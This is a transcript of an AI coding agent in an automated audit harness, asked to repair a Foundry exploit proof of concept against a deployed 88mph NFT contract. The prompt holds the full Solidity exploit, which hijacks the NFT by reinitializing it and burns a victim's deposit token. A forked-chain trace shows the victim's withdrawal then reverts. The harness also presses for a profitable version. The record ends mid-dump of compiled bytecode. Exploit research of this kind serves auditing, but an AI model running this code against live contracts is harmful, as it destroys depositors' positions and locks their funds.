@@ -1,0 +1,2529 @@
+OpenAI Codex v0.107.0 (research preview)
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/88mph/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e2ff9-9ebf-77e3-99db-34a25a20c390
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Anyone can reinitialize the NFT contracts and seize deposit/funding token ownership
+- claim: `NFT.init()` is external and has neither a one-time initialization guard nor access control, so any account can call it on an already-deployed deposit or funding NFT clone and transfer contract ownership to itself. The new owner then gains the owner-only `mint`/`burn` powers over the live position NFTs relied on by the pools.
+- impact: An attacker can take over a pool's `depositNFT` or `fundingNFT`, burn users' position tokens, block future minting, and break the ownership checks used during withdrawals and funder payouts. This can permanently lock depositor and funder claims and DoS the pool.
+- exploit_paths: ["Call `NFT.init(attacker, ...)` on the deployed deposit NFT or funding NFT contract.", "As the new owner, call `burn(tokenId)` on victim deposit/funding NFTs or interfere with future minting.", "Victim `withdraw()` / funder payout paths revert when `ownerOf()` no longer returns a valid holder for the expected NFT."]
+
+Current FlawVerifier.sol:
+```solidity
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface INFTLike {
+    function owner() external view returns (address);
+    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function burn(uint256 tokenId) external;
+}
+
+interface IDInterestLike {
+    struct Deposit {
+        uint256 amount;
+        uint256 maturationTimestamp;
+        uint256 interestOwed;
+        uint256 initialMoneyMarketIncomeIndex;
+        bool active;
+        bool finalSurplusIsNegative;
+        uint256 finalSurplusAmount;
+        uint256 mintMPHAmount;
+        uint256 depositTimestamp;
+    }
+
+    struct Funding {
+        uint256 fromDepositID;
+        uint256 toDepositID;
+        uint256 recordedFundedDepositAmount;
+        uint256 recordedMoneyMarketIncomeIndex;
+        uint256 creationTimestamp;
+    }
+
+    function depositNFT() external view returns (address);
+    function fundingNFT() external view returns (address);
+    function stablecoin() external view returns (address);
+    function depositsLength() external view returns (uint256);
+    function fundingListLength() external view returns (uint256);
+    function getDeposit(uint256 depositID) external view returns (Deposit memory);
+    function getFunding(uint256 fundingID) external view returns (Funding memory);
+    function depositIsFunded(uint256 depositID) external view returns (bool);
+    function withdraw(uint256 depositID, uint256 fundingID) external;
+    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
+    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    address public pool;
+    uint256 public hijackedTokenId;
+    uint256 public linkedFundingId;
+    bool public targetIsDepositNFT;
+    bool public targetIsFundingNFT;
+    bool public hypothesisValidated;
+    bool public burnedVictimToken;
+    bool public ownerQueryRevertedAfterBurn;
+    bool public demonstratedPathRevert;
+    bool public usedEarlyWithdraw;
+    address public victimOwnerBeforeBurn;
+    string public exploitPath;
+    string public failureReason;
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated || bytes(failureReason).length != 0) {
+            return;
+        }
+
+        INFTLike nft = INFTLike(TARGET);
+        pool = nft.owner();
+        if (pool == address(0)) {
+            failureReason = "target owner is zero";
+            return;
+        }
+
+        IDInterestLike market = IDInterestLike(pool);
+        _profitToken = market.stablecoin();
+        _profitAmount = 0;
+
+        targetIsDepositNFT = market.depositNFT() == TARGET;
+        targetIsFundingNFT = market.fundingNFT() == TARGET;
+        if (!targetIsDepositNFT && !targetIsFundingNFT) {
+            failureReason = "target NFT not wired into pool";
+            return;
+        }
+
+        // Step 1 from the finding: reinitialize the already-deployed NFT clone and seize ownership.
+        nft.init(address(this), "hijacked", "HIJACKED");
+        if (nft.owner() != address(this)) {
+            failureReason = "reinitialization failed";
+            return;
+        }
+        hypothesisValidated = true;
+
+        if (targetIsDepositNFT) {
+            exploitPath = "nft.init(attacker, ...) -> burn(tokenId) -> ownerOf(tokenId) breaks -> withdraw()/earlyWithdraw() reverts";
+            _executeDepositPath(market, nft);
+        } else {
+            exploitPath = "nft.init(attacker, ...) -> burn(tokenId) -> ownerOf(tokenId) breaks -> payInterestToFunder() reverts";
+            _executeFundingPath(market, nft);
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _executeDepositPath(IDInterestLike market, INFTLike nft) internal {
+        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositCandidate(market, nft);
+        if (depositID == 0) {
+            failureReason = "no burnable deposit NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = depositID;
+        linkedFundingId = fundingID;
+        usedEarlyWithdraw = useEarly;
+
+        // Step 2 from the finding: as the new NFT owner, burn a live victim deposit NFT.
+        victimOwnerBeforeBurn = nft.ownerOf(depositID);
+        nft.burn(depositID);
+        burnedVictimToken = true;
+
+        // Step 3 anchor from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, depositID);
+
+        (bool reverted, ) = useEarly
+            ? _callEarlyWithdraw(address(market), depositID, fundingID)
+            : _callWithdraw(address(market), depositID, fundingID);
+        demonstratedPathRevert = reverted;
+
+        if (!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned deposit NFT but withdraw path did not revert";
+        }
+    }
+
+    function _executeFundingPath(IDInterestLike market, INFTLike nft) internal {
+        uint256 fundingID = _findFundingCandidate(market, nft);
+        if (fundingID == 0) {
+            failureReason = "no burnable funding NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = fundingID;
+        linkedFundingId = fundingID;
+
+        // Step 2 from the finding: as the new NFT owner, burn a live victim funding NFT.
+        victimOwnerBeforeBurn = nft.ownerOf(fundingID);
+        nft.burn(fundingID);
+        burnedVictimToken = true;
+
+        // Step 3 anchor from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, fundingID);
+
+        (bool reverted, ) = _callPayInterestToFunder(address(market), fundingID);
+        demonstratedPathRevert = reverted;
+
+        if (!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned funding NFT but payout path did not revert";
+        }
+    }
+
+    function _findDepositCandidate(IDInterestLike market, INFTLike nft)
+        internal
+        view
+        returns (uint256 depositID, uint256 fundingID, bool useEarly)
+    {
+        uint256 len = market.depositsLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (!_tokenExists(nft, i)) {
+                continue;
+            }
+
+            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
+            if (!deposit.active) {
+                continue;
+            }
+
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                linked = _findFundingForDeposit(market, i);
+                if (linked == 0) {
+                    continue;
+                }
+            }
+
+            return (i, linked, block.timestamp < deposit.maturationTimestamp);
+        }
+    }
+
+    function _findFundingCandidate(IDInterestLike market, INFTLike nft) internal view returns (uint256 fundingID) {
+        uint256 len = market.fundingListLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (_tokenExists(nft, i)) {
+                return i;
+            }
+        }
+    }
+
+    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
+        uint256 len = market.fundingListLength();
+        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
+            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
+            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
+                return fundingID;
+            }
+        }
+        return 0;
+    }
+
+    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ != address(0);
+        } catch {
+            return false;
+        }
+    }
+
+    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ == address(0);
+        } catch {
+            return true;
+        }
+    }
+
+    function _callWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("withdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callEarlyWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("earlyWithdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callPayInterestToFunder(address market, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("payInterestToFunder(uint256)", fundingID)
+        );
+        return (!ok, data);
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+663CA4fc224CD8De3c4D858259A3E8
+    │   ├─ [19115] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::getDeposit(8) [staticcall]
+    │   │   └─ ← [Return] Deposit({ amount: 2985000000000000000000 [2.985e21], maturationTimestamp: 1619912834 [1.619e9], interestOwed: 12966935893976993625 [1.296e19], initialMoneyMarketIncomeIndex: 1061525441523015916 [1.061e18], active: false, finalSurplusIsNegative: false, finalSurplusAmount: 0, mintMPHAmount: 21218362167715435035 [2.121e19], depositTimestamp: 1614729521 [1.614e9] })
+    │   ├─ [2752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(9) [staticcall]
+    │   │   ├─ [2580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(9) [delegatecall]
+    │   │   │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+    │   │   └─ ← [Return] 0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+    │   ├─ [19115] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::getDeposit(9) [staticcall]
+    │   │   └─ ← [Return] Deposit({ amount: 5970000000000000000 [5.97e18], maturationTimestamp: 1617173309 [1.617e9], interestOwed: 1633466718881 [1.633e12], initialMoneyMarketIncomeIndex: 1061605537249892153 [1.061e18], active: false, finalSurplusIsNegative: false, finalSurplusAmount: 0, mintMPHAmount: 9750933174110 [9.75e12], depositTimestamp: 1617172118 [1.617e9] })
+    │   ├─ [2752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
+    │   │   ├─ [2580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
+    │   │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
+    │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
+    │   ├─ [19115] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::getDeposit(10) [staticcall]
+    │   │   └─ ← [Return] Deposit({ amount: 504559227898593340646 [5.045e20], maturationTimestamp: 1625524002 [1.625e9], interestOwed: 901432948349325085 [9.014e17], initialMoneyMarketIncomeIndex: 1061605737208882291 [1.061e18], active: true, finalSurplusIsNegative: false, finalSurplusAmount: 0, mintMPHAmount: 5381078376862078946 [5.381e18], depositTimestamp: 1617747271 [1.617e9] })
+    │   ├─ [2685] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::depositIsFunded(10) [staticcall]
+    │   │   └─ ← [Return] false
+    │   ├─ [752] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
+    │   │   ├─ [580] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
+    │   │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
+    │   │   └─ ← [Return] 0xf01AD7f76DB963b59Ff1947642c6aC85d7eDEbB7
+    │   ├─ [16076] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::burn(10)
+    │   │   ├─ [15907] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::burn(10) [delegatecall]
+    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
+    │   │   │   │        topic 1: 0x000000000000000000000000f01ad7f76db963b59ff1947642c6ac85d7edebb7
+    │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │        topic 3: 0x000000000000000000000000000000000000000000000000000000000000000a
+    │   │   │   │           data: 0x
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [822] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
+    │   │   ├─ [630] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
+    │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   ├─ [11037] 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD::earlyWithdraw(10, 0)
+    │   │   ├─ [822] 0xF0b7DE03134857391d8D43Ed48e20EDF21461097::ownerOf(10) [staticcall]
+    │   │   │   ├─ [630] 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634::ownerOf(10) [delegatecall]
+    │   │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   │   └─ ← [Revert] ERC721: owner query for nonexistent token
+    │   └─ ← [Stop]
+    ├─ [411] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84
+    ├─ [4803] 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84)
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
+    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>", 12516705 [1.251e7])
+    │   └─ ← [Return] 1
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 8057)
+    └─ ← [Revert] profit below threshold
+
+Backtrace:
+  at 0xDe71B24FE56358cC0ADfd6f2e0f6D8ed9e2CF634.ownerOf
+  at 0xF0b7DE03134857391d8D43Ed48e20EDF21461097.ownerOf
+  at 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD.earlyWithdraw
+  at FlawVerifier.executeOnOpportunity
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.23s (994.72ms CPU time)
+
+Ran 1 test suite in 2.31s (2.23s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 568780)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+mcp startup: no servers
+codex
+I’m going to inspect the harness and nearby PoC patterns first.
+Plan update
+  → Inspect harness expectations
+  • Design profitable causal path
+  • Patch FlawVerifier.sol
+  • Sanity-check compile logic
+exec
+/bin/bash -lc "rg -n \"profit below threshold|profitToken\\(|profitAmount\\(|MIN_PROFIT|PROFIT_MODE|AUDITHOUND_\" -S . .. /Users/zhanglongqin/AuditHoundV2/cases/88mph/src /Users/zhanglongqin/AuditHoundV2/cases/88mph/test" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 2 in 51ms:
+Total output lines: 10
+
+rg: /Users/zhanglongqin/AuditHoundV2/cases/88mph/test: No such file or directory (os error 2)
+/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol:110:    function profitToken() external view returns (address) {
+/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol:114:    function profitAmount() external view returns (uint256) {
+./src/FlawVerifier.sol:110:    function profitToken() external view returns (address) {
+./src/FlawVerifier.sol:114:    function profitAmount() external view returns (uint256) {
+../src/src/FlawVerifier.sol:110:    function profitToken() external view returns (address) {
+../src/src/FlawVerifier.sol:114:    function profitAmount() external view returns (uint256) {
+/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/out/FlawVerifier.sol/FlawVerifier.json:1:{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"burnedVictimToken","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"demonstratedPathRevert","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitPath","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"failureReason","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"hijackedTokenId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"linkedFundingId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"ownerQueryRevertedAfterBurn","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"pool","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"targetIsDepositNFT","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"targetIsFundingNFT","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"usedEarlyWithdraw","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"victimOwnerBeforeBurn","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506123ef8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610108575f3560e01c806356380369116100a0578063880d83a51161006f578063880d83a514610260578063cb707c621461027e578063cc1f2afa1461029c578063e5d3e494146102ba578063ff5b43de146102d857610108565b806356380369146101e85780635ff972cc146102065780636f354bc7146102245780637e21d8191461024257610108565b80633c2448ed116100dc5780633c2448ed14610184578063463defd11461018e57806349343624146101ac5780634f9522a4146101ca57610108565b8062901f401461010c578063127b03831461012a57806316f0115b14610148578063317c6dee14610166575b5f5ffd5b6101146102f6565b6040516101219190611904565b60405180910390f35b6101326102fc565b60405161013f9190611937565b60405180910390f35b61015061030d565b60405161015d919061198f565b60405180910390f35b61016e610332565b60405161017b9190611937565b60405180910390f35b61018c610345565b005b6101966109a4565b6040516101a39190611937565b60405180910390f35b6101b46109b7565b6040516101c1919061198f565b60405180910390f35b6101d26109de565b6040516101df9190611a18565b60405180910390f35b6101f0610a6a565b6040516101fd9190611937565b60405180910390f35b61020e610a7d565b60405161021b9190611904565b60405180910390f35b61022c610a86565b6040516102399190611904565b60405180910390f35b61024a610a8c565b6040516102579190611937565b60405180910390f35b610268610a9f565b6040516102759190611937565b60405180910390f35b610286610ab1565b6040516102939190611a18565b60405180910390f35b6102a4610b3d565b6040516102b1919061198f565b60405180910390f35b6102c2610b55565b6040516102cf919061198f565b60405180910390f35b6102e0610b7b565b6040516102ed9190611937565b60405180910390f35b60035481565b60058054906101000a900460ff1681565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600560039054906101000a900460ff1681565b600560029054906101000a900460ff168061036e57505f6007805461036990611a65565b905014155b6109a2575f73f0b7de03134857391d8d43ed48e20edf2146109790508073ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103d3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103f79190611acc565b60025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f73ffffffffffffffffffffffffffffffffffffffff1660025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16036104d5576040518060400160405280601481526020017f746172676574206f776e6572206973207a65726f000000000000000000000000815250600790816104ce9190611cc4565b50506109a2565b5f60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663e9cbd8226040518163ffffffff1660e01b8152600401602060405180830381865afa158015610543573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105679190611acc565b5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60018190555073f0b7de03134857391d8d43ed48e20edf2146109773ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff166367e3c4d46040518163ffffffff1660e01b8152600401602060405180830381865afa158015610620573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106449190611acc565b73ffffffffffffffffffffffffffffffffffffffff161460055f6101000a81548160ff02191690831515021790555073f0b7de03134857391d8d43ed48e20edf2146109773ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1663939156a26040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106e7573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061070b9190611acc565b73ffffffffffffffffffffffffffffffffffffffff1614600560016101000a81548160ff02191690831515021790555060055f9054906101000a900460ff161580156107645750600560019054906101000a900460ff16155b156107b5576040518060400160405280601e81526020017f746172676574204e4654206e6f7420776972656420696e746f20706f6f6c0000815250600790816107ad9190611cc4565b5050506109a2565b8173ffffffffffffffffffffffffffffffffffffffff1663b2b45df5306040518263ffffffff1660e01b81526004016107ee9190611e27565b5f604051808303815f87803b158015610805575f5ffd5b505af1158015610817573d5f5f3e3d5ffd5b505050503073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561087b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061089f9190611acc565b73ffffffffffffffffffffffffffffffffffffffff1614610906576040518060400160405280601781526020017f7265696e697469616c697a6174696f6e206661696c6564000000000000000000815250600790816108fe9190611cc4565b5050506109a2565b6001600560026101000a81548160ff02191690831515021790555060055f9054906101000a900460ff161561096c576040518060a0016040528060698152602001612212606991396006908161095c9190611cc4565b506109678183610b8e565b61099f565b6040518060a001604052806064815260200161232f60649139600690816109939190611cc4565b5061099e8183610e20565b5b50505b565b600560029054906101000a900460ff1681565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600780546109eb90611a65565b80601f0160208091040260200160405190810160405280929190818152602001828054610a1790611a65565b8015610a625780601f10610a3957610100808354040283529160200191610a62565b820191905f5260205f20905b815481529060010190602001808311610a4557829003601f168201915b505050505081565b600560069054906101000a900460ff1681565b5f600154905090565b60045481565b600560019054906101000a900460ff1681565b60055f9054906101000a900460ff1681565b60068054610abe90611a65565b80601f0160208091040260200160405190810160405280929190818152602001828054610aea90611a65565b8015610b355780601f10610b0c57610100808354040283529160200191610b35565b820191905f5260205f20905b815481529060010190602001808311610b1857829003601f168201915b505050505081565b73f0b7de03134857391d8d43ed48e20edf2146109781565b600560079054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600560049054906101000a900460ff1681565b5f5f5f610b9b8585611077565b9250925092505f8303610bd8576040518060600160405280602781526020016123936027913960079081610bcf9190611cc4565b50505050610e1c565b826003819055508160048190555080600560066101000a81548160ff0219169083151502179055508373ffffffffffffffffffffffffffffffffffffffff16636352211e846040518263ffffffff1660e01b8152600401610c399190611904565b602060405180830381865afa158015610c54573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c789190611acc565b600560076101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508373ffffffffffffffffffffffffffffffffffffffff166342966c68846040518263ffffffff1660e01b8152600401610cf19190611904565b5f604051808303815f87803b158015610d08575f5ffd5b505af1158015610d1a573d5f5f3e3d5ffd5b505050506001600560036101000a81548160ff021916908315150217905550610d438484611262565b600560046101000a81548160ff0219169083151502179055505f81610d7257610d6d86858561131c565b610d7e565b610d7d868585611429565b5b509050806005806101000a81548160ff021916908315150217905550600560049054906101000a900460ff16610ddb576040518060600160405280602981526020016122df6029913960079081610dd59190611cc4565b50610e17565b60058054906101000a900460ff16610e165760405180606001604052806033815260200161227b6033913960079081610e149190611cc4565b505b5b505050505b5050565b5f610e2b8383611536565b90505f8103610e62576040518060600160405280602781526020016123086027913960079081610e5b9190611cc4565b5050611073565b80600381905550806004819055508173ffffffffffffffffffffffffffffffffffffffff16636352211e826040518263ffffffff1660e01b8152600401610ea99190611904565b602060405180830381865afa158015610ec4573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610ee89190611acc565b600560076101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff166342966c68826040518263ffffffff1660e01b8152600401610f619190611904565b5f604051808303815f87803b158015610f78575f5ffd5b505af1158015610f8a573d5f5f3e3d5ffd5b505050506001600560036101000a81548160ff021916908315150217905550610fb38282611262565b600560046101000a81548160ff0219169083151502179055505f610fd784836115e9565b509050806005806101000a81548160ff021916908315150217905550600560049054906101000a900460ff16611034576040518060600160405280602981526020016122df602991396007908161102e9190611cc4565b50611070565b60058054906101000a900460ff1661106f576040518060600160405280603181526020016122ae603191396007908161106d9190611cc4565b505b5b50505b5050565b5f5f5f5f8573ffffffffffffffffffffffffffffffffffffffff1663f154240a6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156110c4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110e89190611e90565b90505f600190505b8181116112585761110186826116f3565b15611245575f8773ffffffffffffffffffffffffffffffffffffffff16639f9fb968836040518263ffffffff1660e01b815260040161114091906119